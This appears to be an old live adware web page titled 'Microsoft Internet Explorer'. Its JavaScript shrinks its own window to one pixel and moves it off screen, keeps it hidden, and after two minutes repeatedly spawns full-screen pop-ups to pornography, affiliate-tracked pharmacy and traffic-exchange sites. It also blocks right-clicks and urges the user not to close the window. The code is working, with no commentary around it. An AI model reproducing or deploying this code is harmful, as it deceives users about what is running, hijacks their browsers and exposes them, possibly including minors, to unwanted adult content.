<html>
<head>
<title>Microsoft Internet Explorer</title>
</head>
<script language=Javascript>
<!--
window.resizeTo(1,1);
window.moveTo(2000,2000);
self.blur();
resizer=window.setInterval("window.resizeTo(1,1);window.moveTo(2000,2000);",800)

spstart=120000;
spinterval=20000;

winh=window.screen.height;
winw=window.screen.width;

tv=new Array(7);

tv[0]="www.teenshave.com/ad.html?169F4:A";
tv[1]="www.exittraffic.net/fullpage/ifriends/";
tv[2]="www.sexgallery.com/";
tv[3]="all.global-intermedia.com/index.php?a=1000335";
tv[4]="www.exittraffic.net/fullpage/xpays/schoolgirls/";
//tv[5]="www.bestrxdrugs.com/";
tv[5]='www.herbalo.com/cgi-bin/jwsshop/jws-track.cgi?ID=herb6927&Site=dochrbph';
tv[6]="www.exittraffic.net/consoles/pornkings/1/";
tv[7]='www.orgyfantasy.com/?revid=7659';
//tv[7]="www.discountporn.com/?pu=0&warning=0";

function rand(number) {
	return Math.floor(Math.random()*number);
}

function KillWindow(){
	window.clearInterval(winopener);
	window.close();
}

function spawnIt(url){
	spawnwin=window.open('http://'+url,"spawnedit","height="+(winh-140)+",width="+(winw-15)+",left=25,top=0,scrollbars=1,status=1,resizable=1,location=1,toolbar=1");
}

spawnwin=0;
function showsite(){
	if(!spawnwin||spawnwin.closed){ //!spawnwin avoids spawnwin not-an-object error
		url=0;
		if(tv.length==0){
			spawnIt();
			return KillWindow(); //return kills the loop
		}
		while(!url){
			random=rand(tv.length);
			url=tv[random];
			tmp=tv[tv.length-1];
			tv[tv.length-1]=tv[random];
			tv[random]=tmp;
			tv.length--;
		}
		spawnIt(url);
		if(tv.length==0) KillWindow();
	}
}

window.setTimeout('showsite();winopener=window.setInterval("showsite()",spinterval)',spstart);

function md(e){
	if(((document.all)&&(event.button==3||event.button==2))||((document.layers)&&(e.which==3||e.which==2))){
		alert("This window automatically closes itself!");
		return false;
	}
}

if(document.all)document.onmousedown=md;
if(document.layers){
	window.captureEvents(Event.MOUSEDOWN);
	window.onmousedown=md;
}
//-->
</script>
<BODY BGCOLOR=#000000 TEXT=#FFFFFF>
<center><font size=1 face=Arial><marquee width=180><blink><b>DON'T CLOSE THIS WINDOW!</b></blink></marquee></font></center>
</BODY>
</HTML>
